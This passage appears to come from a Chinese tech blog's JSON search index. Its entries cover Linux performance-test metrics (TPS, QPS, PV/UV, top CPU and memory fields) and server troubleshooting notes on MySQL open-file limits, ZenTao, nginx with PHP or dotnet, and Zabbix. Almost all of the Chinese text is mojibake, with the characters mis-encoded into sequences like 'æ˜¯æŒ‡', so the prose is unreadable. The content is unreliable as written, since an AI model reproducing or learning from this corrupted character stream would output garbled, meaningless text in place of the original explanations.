Secondï¼‰æ˜¯æŒ‡å•ä½æ—¶é—´ï¼ˆæ¯ç§’ï¼‰ç³»ç»Ÿå¤„ç†çš„äº‹åŠ¡é‡ã€‚äº‹åŠ¡å¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—æ“ä½œæˆ–è€…åŠ¨ä½œçš„é›†åˆï¼Œæ¯”å¦‚â€œç”¨æˆ·æ³¨å†Œâ€œäº‹åŠ¡æ˜¯ç‚¹å‡»æ³¨å†ŒæŒ‰é’®ï¼Œå¡«å†™ç”¨æˆ·æ³¨å†Œä¿¡æ¯ï¼Œç‚¹å‡»æäº¤æŒ‰é’®ï¼Œä»¥åŠåŠ è½½æ³¨å†ŒæˆåŠŸé¡µé¢çš„åŠ¨ä½œé›†åˆã€‚ QPSï¼ˆQuery Per Secondï¼‰æ˜¯æŒ‡å•ä½æ—¶é—´å†…æŸ¥è¯¢æˆ–è®¿é—®æœåŠ¡å™¨çš„æ¬¡æ•°ã€‚ TPSå’ŒQPSçš„åŒºåˆ«åœ¨äºä¸€ä¸ªäº‹åŠ¡å¯ä»¥åŒ…å«å¤šæ¬¡æŸ¥è¯¢æˆ–è®¿é—®æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åªæŸ¥è¯¢æˆ–è®¿é—®ä¸€æ¬¡æœåŠ¡å™¨ã€‚å½“å¤šæ¬¡æŸ¥è¯¢æˆ–è®¿é—®æ—¶ï¼Œä¸€ä¸ªTPSç›¸å½“äºå¤šä¸ªQPSï¼›å½“åªæŸ¥è¯¢æˆ–è®¿é—®ä¸€æ¬¡æ—¶ï¼Œä¸€ä¸ªTPSåˆ™ç­‰ä»·äºä¸€ä¸ªQPSã€‚ 1.6. PV/UV PVå’ŒUVæ˜¯è¡¡é‡webç½‘ç«™æ€§èƒ½å®¹é‡çš„ä¸¤ä¸ªé‡è¦åº¦é‡æŒ‡æ ‡ï¼Œç»å¸¸ç”¨åœ¨ç”µå­å•†åŠ¡ç½‘ç«™é¢†åŸŸä¸­ç”¨æ¥è¡¡é‡ç½‘ç«™çš„æ´»è·ƒåº¦ã€‚ PVï¼ˆPage Viewï¼‰æ˜¯é¡µé¢çš„æµè§ˆé‡æˆ–ç‚¹å‡»é‡ï¼Œç”¨æˆ·å¯¹ç³»ç»Ÿæˆ–è€…ç½‘ç«™ä»»ä½•é¡µé¢çš„æ¯ä¸€æ¬¡ç‚¹å‡»æˆ–è€…è®¿é—®éƒ½ä¼šè¢«è®°å½•ä¸€æ¬¡æµè§ˆé‡æˆ–ç‚¹å‡»é‡ï¼Œå¯¹ç›¸åŒé¡µé¢è¿›è¡Œå¤šæ¬¡è®¿é—®æµè§ˆé‡æˆ–ç‚¹å‡»é‡ä¹Ÿä¼šè¿›è¡Œç´¯è®¡ã€‚ UVï¼ˆUnique Vistorï¼‰æ˜¯ç³»ç»Ÿæˆ–è€…ç½‘ç«™çš„ç‹¬ç«‹è®¿å®¢ï¼Œä¸€æ®µæ—¶é—´å†…ç›¸åŒå®¢æˆ·ç«¯ï¼ˆæˆ–PCï¼‰è®¿é—®ç³»ç»Ÿæˆ–è€…ç½‘ç«™åªä¼šè¢«è®°å½•ä¸€æ¬¡ï¼Œè¿ç»­é‡å¤è®¿é—®æˆ–è€…æµè§ˆå¤šä¸ªç³»ç»Ÿé¡µé¢æ¬¡æ•°ä¸ä¼šè¿›è¡Œç´¯è®¡ã€‚ PVå’ŒUVæŒ‰ç…§ç»Ÿè®¡å‘¨æœŸåˆ’åˆ†ï¼Œå¯ä»¥åˆ’åˆ†ä¸ºå…¨å¤©PVã€æ¯å°æ—¶PVã€å…¨å¤©UVå’Œæ¯å°æ—¶UVç­‰ã€‚åœ¨ä¸€äº›æ•°æ®æˆ–äº¤æ˜“é‡éå¸¸åºå¤§çš„åœºæ™¯ä¸­ï¼Œæ¯”å¦‚åŒ11æˆ–618ç­‰å…¨æ°‘è´­ç‰©æ´»åŠ¨æ—¶ï¼Œå¸¸å¸¸è¿˜ä¼šç»Ÿè®¡å³°å€¼PVå’Œå³°å€¼UVã€‚ 2. LinuxæœåŠ¡å™¨æ€§èƒ½æŒ‡æ ‡ 2.1. CPUä½¿ç”¨ç‡ CPUä½¿ç”¨ç‡æ˜¯å•ä½æ—¶é—´å†…æœåŠ¡å™¨CPUçš„ä½¿ç”¨ç»Ÿè®¡ï¼Œå¯ä»¥ç”¨é™¤CPUç©ºé—²æ—¶é—´å¤–å…¶ä»–æ—¶é—´å æ€»CPUæ—¶é—´çš„ç™¾åˆ†æ¯”æ¥è¡¨ç¤ºï¼Œå³ï¼šCPUä½¿ç”¨ç‡=1-CPUç©ºé—²æ—¶é—´/æ€»CPUæ—¶é—´ å‘½ä»¤ï¼š#top //topå·¥å…·é—´éš”3sä¼šåŠ¨æ€æ»šåŠ¨æ›´æ–°ä¸€æ¬¡æ•°æ® å­—æ®µ è¯´æ˜ us (user) ç”¨æˆ·æ€çš„CPUä½¿ç”¨æ—¶é—´æ¯”ä¾‹ï¼Œæ˜¯ç”¨æˆ·è¿è¡Œç¨‹åºçš„çœŸæ­£æ—¶é—´ï¼Œå®ƒä¸åŒ…æ‹¬åé¢çš„niæ—¶é—´ï¼› sy (system) å†…æ ¸æ€çš„CPUä½¿ç”¨æ—¶é—´æ¯”ä¾‹ï¼Œæ˜¯æ“ä½œç³»ç»Ÿçš„è¿è¡Œæ—¶é—´ï¼Œæ“ä½œç³»ç»Ÿè¿è¡Œæ—¶ï¼Œç”¨æˆ·è¿è¡Œç¨‹åºå¾€å¾€å¤„äºç­‰å¾…çŠ¶æ€ï¼› ni (nice) è¡¨ç¤ºä½ä¼˜å…ˆçº§ç”¨æˆ·æ€çš„CPUæ—¶é—´æ¯”ä¾‹ï¼Œå–å€¼èŒƒå›´ä¸º[-20,19]ï¼Œæ•°å€¼è¶Šå¤§ï¼Œåˆ™ä¼˜å…ˆçº§è¶Šä½ï¼› id (idle) è¡¨ç¤ºç©ºé—²çš„CPUæ—¶é—´æ¯”ä¾‹ï¼Œå€¼è¶Šå¤§ï¼ŒCPUç©ºé—²æ—¶é—´æ¯”ä¾‹è¶Šé«˜ï¼Œåˆ©ç”¨ç‡è¶Šä½ï¼› wa (iowait) è¡¨ç¤ºå¤„äºIOç­‰å¾…çŠ¶æ€çš„CPUæ—¶é—´æ¯”ä¾‹ï¼› hi (hard interrupt) è¡¨ç¤ºå¤„ç†ç¡¬ä¸­æ–­çš„CPUæ—¶é—´æ¯”ä¾‹ï¼› si (soft interrupt) ä¸hiç›¸åï¼Œè¡¨ç¤ºå¤„ç†è½¯ä¸­æ–­çš„CPUæ—¶é—´æ¯”ä¾‹ï¼› st (steal) è¡¨ç¤ºå½“å‰ç³»ç»Ÿè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­è¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„CPUæ—¶é—´æ¯”ä¾‹ã€‚ åœ¨æ€§èƒ½æµ‹è¯•ä¸­ï¼Œç³»ç»Ÿæ•´ä½“çš„CPUä½¿ç”¨ç‡å¯ä»¥ç”¨ï¼ˆ1-idï¼‰æ¥è®¡ç®—ã€‚å½“uså¾ˆé«˜æ—¶ï¼Œè¯´æ˜CPUæ—¶é—´ä¸»è¦æ¶ˆè€—åœ¨ç”¨æˆ·ä»£ç ä¸Šï¼Œå¯ä»¥ä»ç”¨æˆ·ä»£ç è§’åº¦è€ƒè™‘ä¼˜åŒ–æ€§èƒ½ï¼›å½“syå¾ˆé«˜æ—¶ï¼Œè¯´æ˜CPUæ—¶é—´ä¸»è¦æ¶ˆè€—åœ¨å†…æ ¸ä¸Šï¼Œå¯ä»¥ä»æ˜¯å¦ç³»ç»Ÿè°ƒç”¨é¢‘ç¹ã€CPUè¿›ç¨‹æˆ–çº¿ç¨‹åˆ‡æ¢é¢‘ç¹è§’åº¦è€ƒè™‘æ€§èƒ½çš„ä¼˜åŒ–ï¼›å½“waå¾ˆé«˜æ—¶ï¼Œè¯´æ˜æœ‰è¿›ç¨‹åœ¨è¿›è¡Œé¢‘ç¹çš„IOæ“ä½œï¼Œå¯èƒ½æ˜¯ç£ç›˜IOæˆ–è€…ç½‘ç»œIOã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚æœ%us+%sy\u003c=70%ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºç³»ç»Ÿçš„è¿è¡ŒçŠ¶æ€è‰¯å¥½ã€‚ 2.2. å†…å­˜å ç”¨ç‡ Linuxçš„ç³»ç»Ÿå†…å­˜ç®¡ç†æœºåˆ¶éµå¾ªå†…å­˜åˆ©ç”¨ç‡æœ€å¤§åŒ–çš„åŸåˆ™ã€‚å†…æ ¸ä¼šå°†ç©ºä½™çš„å†…å­˜åˆ’åˆ†ä¸ºcachedï¼ˆä¸å±äºfreeï¼‰ï¼Œå¯¹äºæœ‰é¢‘ç¹è¯»å–æ“ä½œçš„æ–‡ä»¶æˆ–æ•°æ®ä¼šè¢«ä¿å­˜åœ¨cachedä¸­ã€‚å› æ­¤ï¼Œå¯¹äºlinuxç³»ç»Ÿæ¥è¯´ï¼Œå¯ç”¨äºåˆ†é…çš„å†…å­˜ä¸æ­¢freeçš„å†…å­˜ï¼ŒåŒæ—¶è¿˜åŒ…æ‹¬cachedçš„å†…å­˜ï¼ˆå…¶å®è¿˜åŒ…æ‹¬buffersçš„å†…å­˜ï¼‰ã€‚ cachedå’Œbufferséƒ½å±äºç¼“å­˜ï¼Œå®ƒä»¬çš„åŒºåˆ«ä¸»è¦åœ¨äºcachedä¸»è¦ç”¨æ¥ç¼“å†²é¢‘ç¹è¯»å–çš„æ–‡ä»¶ï¼Œå®ƒå¯ä»¥ç›´æ¥è®°å¿†æˆ‘ä»¬æ‰“å¼€çš„æ–‡ä»¶å†…å®¹ï¼›è€Œbuffersä¸»è¦ç”¨æ¥ç»™å—è®¾å¤‡åšçš„ç¼“å†²å¤§å°ï¼Œåªè®°å½•æ–‡ä»¶ç³»ç»Ÿçš„metadataä»¥åŠtracking in-flight pagesä¿¡æ¯ï¼Œæ¯”å¦‚å­˜å‚¨ç›®å½•é‡Œé¢çš„å†…å®¹ï¼Œæƒé™ç­‰ã€‚ topå·¥å…·æ—¢å¯ä»¥æŸ¥çœ‹ç³»ç»ŸCPUä½¿ç”¨æƒ…å†µï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿå†…å­˜ä½¿ç”¨ä¿¡æ¯ã€‚ å‘½ä»¤ï¼š#top åœ¨æ€§èƒ½æµ‹è¯•ä¸­ï¼Œç»å¸¸ä¼šç”¨åˆ°ç³»ç»Ÿå·²ç”¨å†…å­˜ã€ç‰©ç†å·²ç”¨å†…å­˜ã€ç³»ç»Ÿå†…å­˜å ç”¨ç‡ä»¥åŠç‰©ç†å†…å­˜å ç”¨ç‡è¿™å‡ ä¸ªæŒ‡æ ‡ï¼Œå®ƒä»¬çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š ç³»ç»Ÿå·²ç”¨å†…å­˜MemUsed=MemTotal","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxæ€§èƒ½æµ‹è¯•ä¹‹æ€§èƒ½æµ‹è¯•æŒ‡æ ‡(è½¬è½½)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æœåŠ¡å™¨è¿ç»´æ•…éšœè®°å½•","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"æœåŠ¡å™¨è¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysql Errcode: 24 - Too many open files https://blog.csdn.net/weixin_36343850/article/details/86293700 åŸå› ï¼šæ‰“å¼€æ–‡ä»¶æ•°é‡å¤ªå¤šï¼Œè¶…å‡ºäº†open_files_limitè¿™ä¸ªå‚æ•°çš„é™åˆ¶ï¼Œåœ¨ä¸€ä¸ªè¡¨ä¸­æœ‰å¤šä¸ªåˆ†åŒºçš„æ—¶å€™ï¼Œè¿™ç§æƒ…å†µæ›´å®¹æ˜“å‘ç”Ÿã€‚ è§£å†³æ–¹æ³•ï¼š æŸ¥çœ‹ open_files_limitå‚æ•°, ä½¿ç”¨show variables like '%open%';å°±å¯ä»¥çœ‹åˆ°äº† ä¿®æ”¹ open_files_limitå‚æ•° åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆå¤šèµ„æ–™ï¼Œæœ‰çš„è¯´ç›´æ¥åœ¨/etc/mysql/mysql.conf.d/mysqld.cnfæ–‡ä»¶ä¸­çš„[mysqld]éƒ¨åˆ†æ·»åŠ open_files_limitå‚æ•°ï¼Œæ¯”å¦‚open_files_limit=10240ï¼Œå¹¶ä¸”åœ¨/etc/security/limits.conf æ·»åŠ mysql soft nofile 10240å’Œmysql hard nofile 10240è¿™ä¸¤ä¸ªå‚æ•°ç„¶åé‡å¯MySQLï¼Œä½†æ˜¯å‘ç°ä¸èƒ½ç”Ÿæ•ˆã€‚ ä»¥ä¸‹æ–¹æ³•å¯ç”¨ï¼š åœ¨æ–‡ä»¶/etc/systemd/system/multi-user.target.wants/mysql.service(ä¹Ÿæœ‰å¯èƒ½æ˜¯/etc/systemd/system/mysql.serviceè¿™ä¸ªæ–‡ä»¶)æœ€åæ·»åŠ LimitNOFILE=10240 ç„¶åæ‰§è¡Œsystemctl daemon-reloadï¼Œæ¥ç€å†é‡å¯mysqlæœåŠ¡sudo service mysql restart,å¯ä»¥çœ‹åˆ°å·²ç»ä¿®æ”¹æˆåŠŸäº† ç¦…é“bugç®¡ç†ç³»ç»Ÿ è¿™ä¸ªéƒ¨ç½²é‡åˆ°çš„ä¸€ä¸ªå‘å°±æ˜¯phpæ‰“æ­»è·å–ä¸åˆ°sessionçš„ä½ç½® æ‰“å¼€è°ƒè¯•æ—¥å¿—æ–¹å¼æ˜¯å°†my.cnf ä¸­debugè®¾ç½®ä¸ºtrue å®é™…é”™è¯¯ä½“ç°æ˜¯ ERROR: æ‚¨è®¿é—®çš„åŸŸå xxx.xxx.xxx æ²¡æœ‰å¯¹åº”çš„å…¬å¸ã€‚ æˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯ ä»£ç ç›®å½•æ•´ä½“æƒé™è®¾ç½®ä¸º777,ç„¶ååˆ é™¤æ‰my.cnfè¿›è¡Œé‡è£…,é‡è£…ååœ¨ç›®å½•æƒé™è°ƒæ•´ä¸ºæ­£å¸¸æƒé™å³å¯. å®‰è£…å®Œæˆåï¼Œé¦–é¡µå‡ºç°æ— é™å¾ªç¯é‡å®šå‘ï¼Œæ‰‹åŠ¨å°†my.phpä¸­PATH_INFOä¿®æ”¹ä¸ºGETï¼Œæˆ–åœ¨nginxä¼ å…¥å˜é‡PATH_INFOå€¼$request_uri; nginx ä»£ç†phpäº§ç”Ÿçš„ä¸€äº›æ•…éšœ è®°å½•ä¸€ä¸ªnginx ä»£ç† php äº§ç”Ÿçš„é—®é¢˜,é—®é¢˜å·²ç»è§£å†³äº†,ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°æ ¹æœ¬åŸå› ,è‹¥æœ‰äº†è§£çš„,è¯·ä¸€å®šè§£æƒ‘ä¸€äºŒ, ä»¥ä¸‹è®°å½•ä¸‹å¤„ç†è¿‡ç¨‹ . é—®é¢˜äº§ç”Ÿè¿‡ç¨‹: AæœåŠ¡å™¨ä»£ç è¿ç§»åˆ°Bæœºå™¨ä¸Š,ä»£ç æ˜¯rsyncç›´æ¥åŒæ­¥çš„,ç„¶åBè¿è¡Œçš„æ—¶å€™å°±å‡ºé—®é¢˜äº†,æ ¹æ®è°ƒè¯•å‘ç°,æ— è®ºè®¿é—®ä»€ä¹ˆ(html/js/css)éƒ½ä¼šè·³è½¬åˆ°é¦–é¡µ,å®é™…åº”è¯¥æ˜¯éƒ½ä¼šç»è¿‡phpè§£æ(æˆ‘å‘èª“Aå’ŒBçš„ç¯å¢ƒé…ç½®æ˜¯ä¸€æ¨¡ä¸€æ ·çš„!Aå¯ä»¥æ­£å¸¸è¿è¡Œ.), phpæ¡†æ¶ä¸ºopencart . æµè§ˆå™¨è®¿é—®è¡¨ç°ä»¥ä¸‹é”™è¯¯: Resource interpreted as Stylesheet but transferred with MIME type text/html ERR_CONNECTION_REFUSED å¤„ç†è¿‡ç¨‹ : é—®é¢˜å®é™…ä¸Šæ˜¯å¤´ä¸€å¤©å‘ç”Ÿçš„,ç»è¿‡å¤šæ–¹è°ƒè¯•å‘ç°,å®é™…ä¸Šé€šè¿‡åŸŸåè®¿é—®ä»»ä½•èµ„æºå‡ä¼šè·³è½¬åˆ°é¦–é¡µ,è®¿é—®phpèµ„æºåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½js/cssç­‰é™æ€èµ„æºå…¨éƒ¨éƒ½æ˜¯MIMEç±»å‹é—®é¢˜,nginxå¼ºè¡Œç»™css/jsç­‰èµ„æºè®¾ç½®ä¸€ä¸ªcontent-typeå‰ç«¯ä¹Ÿæ— æ³•è¯†åˆ«æ­£ç¡®,å¦å¤–ä¹Ÿæµ‹è¯•è¿‡ç½‘ä¸Šæä¾›çš„å¤šæ–¹è§£å†³æ–¹æ¡ˆ,ä»ç„¶æ— æ³•å¾—åˆ°è§£å†³ . ç¬¬äºŒå¤©, ä¿æŒåŸæœ‰nginxé…ç½® , æˆ‘ç»™å¯¹åº”ç«™ç‚¹é¦–é¡µçš„index.phpä»£ç ä¸­åŠ å…¥äº†echo 123; exit();è¿›è¡Œæµ‹è¯•,è®¿é—®å‘ç°å¯æ­£å¸¸æ–­å¼€,æ­¤æ—¶åœ¨è®¿é—®æ ¹ä¸‹çš„é™æ€htmlæµ‹è¯•æ–‡ä»¶,å‘ç°å¯ä»¥æ­£å¸¸è®¿é—®äº†,æ­¤æ—¶åˆ é™¤echo 123; exit();,é‡æ–°è®¿é—®index.php,å‘ç°(js/css)é™æ€èµ„æºè¢«å‡çº§ä¸ºhttpsè®¿é—®,æ­¤æ—¶æˆ‘ç»™ç›¸å…³åŸŸåé…ç½®ä¸Šè¯ä¹¦,ç„¶åè®¿é—®å°±æ­£å¸¸äº†!!! åŸå› åˆ†æ: ç«™ç‚¹ç¼“å­˜(è¿™ä¸ªå¯èƒ½æ€§æœ€å¤§),opencartæ¡†æ¶å®é™…ä¸Šsessionæ˜¯å­˜å‚¨åˆ°æ•°æ®åº“ä¸­çš„,ä¼°è®¡å¾ˆå¤šçš„cacheä¹Ÿæ˜¯å­˜äºæ•°æ®ä¸­çš„,è€Œä»Šå¤©è§£å†³çš„æ—¶é—´ä¹Ÿæ°å¥½è·ç¦»æˆ‘æœ€åä¸€æ¬¡åŒæ­¥ä¸€å¤©çš„æ ·å­. nginx é…ç½®åŸŸåè¿‡å¤š,å¯¼è‡´é…ç½®æ··ä¹±. BæœåŠ¡å™¨çš„nginxå®é™…ä¸Šå·²ç»é…ç½®äº†å¾ˆå¤šä¸ªåŸŸå,phpè§£æçš„SCRIPT_FILENAME æˆ‘ä½¿ç”¨çš„æ˜¯$document_root,æœ€åä¸€æ¬¡ä¿®æ”¹æˆ‘ä¹Ÿå°†$document_rootä¿®æ”¹ä¸ºäº†å…·ä½“çš„è·¯å¾„,ä¸çŸ¥é“ä¼šä¸ä¼šæ˜¯è¿™ä¸ªåŸå› äº§ç”Ÿçš„. zabbix è‡ªåŠ¨å‘ç°å¼‚å¸¸é”™è¯¯ å…·ä½“é”™è¯¯è¡¨ç° Cannot create item: item with the same key \"domain.status[{#DOMAIN_NAME},http_code]\" already exists. Cannot accurately apply filter: no value received for macro \"{#DOMAINNAME}\". è§£å†³æ–¹æ¡ˆ è¿™ä¸ªæ˜¯ç‰¹ä¹ˆçš„è‡ªåŠ¨å‘ç°è„šæœ¬è¿”å›å€¼çš„keyå¿…é¡»ç”¨{}æ‹¬èµ·æ¥,ä¸ç„¶ä½ å³ä½¿æ˜¯jsonæ ¼å¼ä»–ä¹Ÿä¸ä¼šè®¤, ç½‘ä¸Šé‚£äº›è¿™ä¸ªæŠ„é‚£ä¸ªçš„å‘è´§å°±åªçŸ¥é“å˜é‡è¦å¤§å†™ï¼Œè¿˜æœ‰ä¸ªå‘å‘Šè¯‰æˆ‘è¦ä½¿ç”¨å®,ç”¨äº†å®å°±æ˜¯ç¬¬äºŒä¸ªé—®é¢˜,ä¸ç”¨ç¬¬ä¸€ä¸ªï¼Œè¿™æˆ‘æ˜¯è®°å¾—å¾ˆæ¸…æ¥šï¼Œå®å¹¶ä¸æ˜¯å¿…å®šè¦æœ‰çš„å•Šï¼Œæˆ‘ä»¥å‰å†™ä¹ŸåŸºæœ¬æ²¡æœ‰åŠ è¿‡ã€‚ æˆ‘ç‰¹ä¹ˆä¹Ÿæ˜¯è ¢äº†ï¼Œå†™äº†è¿™ä¹ˆå¤šçš„è‡ªåŠ¨å‘ç°ï¼Œå±…ç„¶æ²¡æœ‰æ³¨æ„è¦æ‹¬èµ·æ¥ã€‚ nginx ä¼ªé™æ€æ— æ•ˆé—®é¢˜ å…·ä½“é”™è¯¯ä½“ç° æ‹¿åˆ°apacheçš„.htaccessæ–‡ä»¶åï¼Œé€šè¿‡https://www.winginx.com/en/htaccessè½¬æ¢ä¸ºäº†nginxå¯ç”¨çš„è§„åˆ™ï¼Œä½†åŠ å…¥åè®¿é—®è·³è½¬ä¸€ç›´æ˜¯404,ç»æ£€æŸ¥locationæ˜¯å®šä½æˆåŠŸäº†çš„ï¼Œä½†å°±æ˜¯è®¿é—®ä¸äº† è§£å†³æ–¹æ¡ˆ: åç»­å¼€å‘æä¾›äº†å¦ä¸€ä¸ªä¼ªé™æ€é…ç½®,æ‰€æœ‰rewriteæ˜¯æ”¾åœ¨ifæŒ‡ä»¤ä¸­(!-e $request_filename)ï¼Œç„¶åå°±å¯ä»¥äº†ã€‚æˆ‘å¯¹æ¯”äº†ä¸‹ï¼Œä¸¤è€…çš„å·®å¼‚å°±æ˜¯ï¼Œä¸€ä¸ªæ˜¯æ”¾åœ¨äº†locationä¸­ï¼Œå®šä½äº†æ¯ä¸€ä¸ªrewriteæ‰€åœ¨çš„ä½ç½®ã€‚è¿˜æœ‰å°±æ˜¯æ”¾åœ¨ifä¸­çš„rewriteçš„åŒ¹é…è§„åˆ™æ˜¯ç”¨å¼•å·æ‹¬èµ·æ¥äº†çš„ã€‚å…·ä½“åŸå› æš‚æ—¶è¿˜æ˜¯æ¯ææ¸…æ¥šã€‚åç»­å‡ºç°éœ€æµ‹è¯•ä¸‹å¼•å·æ˜¯å¦æœ‰å½±å“. nginx åå‘ä»£ç†åç«¯æœåŠ¡å™¨ï¼Œéƒ¨åˆ†èµ„æºå‡ºç°502é”™è¯¯ é—®é¢˜æè¿°: åç«¯æ˜¯dotnetåº”ç”¨ï¼Œåå‘ä»£ç†æ—¶å€™åŸŸåè¯·æ±‚é¡µé¢éƒ¨åˆ†css/jsèµ„æºè¿”å›502é”™è¯¯ã€‚ç›´æ¥è¯·æ±‚æŠ¥é”™çš„css/jsåˆæ˜¯æ­£å¸¸çš„ï¼Œå‰ç«¯ç»•è¿‡nginxç›´æ¥è®¿é—®dotnetæ‰€æœ‰è¿”å›åˆæ˜¯æ­£å¸¸çš„ã€‚åªæœ‰ç»è¿‡nginxä¼šå‡ºç°è¯¥é—®é¢˜ã€‚ è§£å†³è¿‡ç¨‹ï¼š ç½‘ä¸Šæœç´¢åˆ°å¾ˆå¤šçš„è§£å†³æ–¹æ¡ˆï¼Œè¿™ä¸€ä¸ªæ„Ÿè§‰æœ‰ç‚¹ç”¨ï¼Œä½†å¹¶æ²¡æœ‰è§£å†³æˆ‘çš„é—®é¢˜,è¯´çš„æ˜¯headerè¿‡å¤§ï¼Œè¶…å‡ºäº†é»˜è®¤çš„1kï¼Œå°±ä¼šå¼•å‘ä¸Šè¿°çš„upstream sent too big headerï¼ŒnginxæŠŠå¤–éƒ¨è¯·æ±‚ç»™åç«¯å¤„ç†ï¼Œåç«¯è¿”å›çš„headerå¤ªå¤§ï¼Œnginxå¤„ç†ä¸è¿‡æ¥å°±ä¼šå¯¼è‡´502ï¼Œè¿™ä¸ªé—®é¢˜æå‡ºçš„è§£å†³æ˜¯ï¼Œå¢å¤§proxy_buffer_size/proxy_buffers/proxy_busy_buffers_size,ä¸è¿‡è¿˜æ˜¯è®°å½•ä¸‹ï¼Œæ¯•ç«Ÿä¸æ˜¯æ¯ä¸ªé—®é¢˜åŸå› éƒ½ä¸€æ ·ã€‚ è¿™æ˜¯æˆ‘å½“æ—¶å‚è€ƒçš„ç¬¬äºŒä¸ªæ–¹æ¡ˆ,æ ¹æ®å®˜æ–¹æ–‡æ¡£https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive,è°ƒæ•´äº†upstreamä¸­keepalive,æˆ‘åŸæ¥è®¾ç½®çš„æ˜¯2,ç°è°ƒæ•´ä¸º16,å¹¶è®¾ç½®äº†Connection \"Keep-Alive\";(è¿™ä¸ªè®¾ç½®æ˜¯ä¸ºäº†ä¿æŒhttp/1.0æŒä¹…é“¾æ¥ï¼Œå®˜æ–¹ä¸å»ºè®®ä½¿ç”¨æ­¤å‚æ•°ï¼Œä½†æˆ‘è¿™è¾¹websokcetå’Œhttp/1.0,å•ç‹¬è®¾ç½®ä¸€ä¸ªå¹¶æ²¡æœ‰æ•ˆæœï¼Œæ‰€ä»¥ä¸¤ä¸ªéƒ½è®¾ç½®äº†)ã€‚è¿™ä¸ªæ–¹æ¡ˆå½“æ—¶è§£å†³äº†ä¸€éƒ¨åˆ†çš„é—®é¢˜ã€‚ä½†æ ¹æœ¬å¹¶æœªå¾—åˆ°è§£å†³ã€‚ ç„¶åæœ€ç»ˆçš„æ–¹æ¡ˆï¼Œé‡å¯åº”ç”¨æœåŠ¡å™¨ï¼Œé—®é¢˜å®Œå…¨è§£å†³ï¼ï¼ï¼ åŸå› åˆ†æï¼šçªç„¶ä¸çŸ¥é“æ€ä¹ˆä¸‹ç¬”äº†ï¼Œåæ­£å°±æ˜¯ç³»ç»Ÿtcpè¿æ¥è¿‡å¤šï¼Œæœ€å¼€å§‹ä½“ç°å°±æ˜¯å‡ºç°å¤§é‡çš„CLOSE_WAIT,å½“æ—¶é‡å¯äº†å¯¹åº”å ç”¨çš„ç¨‹åºï¼Œæ¸…ç†ä¸€äº›è¿æ¥ï¼Œå‡ºç°ä¸€å®šçš„å¥½è½¬ï¼Œä½†ä¹Ÿä»…ä»…å‡ºç°äº†å¥½è½¬ï¼Œåé¢å¯èƒ½ç”±äºæŸäº›åŸå› ï¼Œå¯¼è‡´é‡å¯åº”ç”¨ä¹Ÿæ— æ³•è§£å†³äº†ï¼Œæœ€åé‡å¯æœåŠ¡å™¨ï¼Œé—®é¢˜å®Œå…¨è§£å†³ã€‚ åº”è¯¥ä¸æ˜¯æ¯ä¸ªäººéƒ½æ˜¯è¿™ä¸ªåŸå› ï¼Œä¸è¿‡å¯ä»¥å‚è€ƒä¸‹ã€‚ nginx åå‘ä»£ç† cdnå›æº(å¤šå±‚nginx)å‡ºç° 502ã€503ã€504 ç­‰å¼‚å¸¸ åœ¨æˆ‘çš„éƒ¨ç½²æ¨¡å¼ä¸­ï¼Œå¾ˆå¤šæ—¶å€™éƒ½æ˜¯dockerä¸å®é™…åº”ç”¨ç¯å¢ƒæ··åˆéƒ¨ç½²(å¤šç¯å¢ƒï¼Œå•èŠ‚ç‚¹)ï¼Œå¤§å¤šçš„ç»“æ„æ˜¯ dockerè¿è¡Œç¨‹åºç¯å¢ƒï¼Œnginxåå‘ä»£ç†åˆ°dockeræš´éœ²çš„ç«¯å£ï¼Œä»è€Œå®ç°åº”ç”¨çš„æ­£å¸¸è®¿é—®ã€‚æˆ‘è¿™æ¬¡é‡åˆ°çš„è¿™ä¸ªé—®é¢˜ï¼Œæœ€å¼€å§‹çš„æ—¶å€™æˆ‘ä»¥ä¸ºæ˜¯cdnçš„é—®é¢˜ï¼Œå› 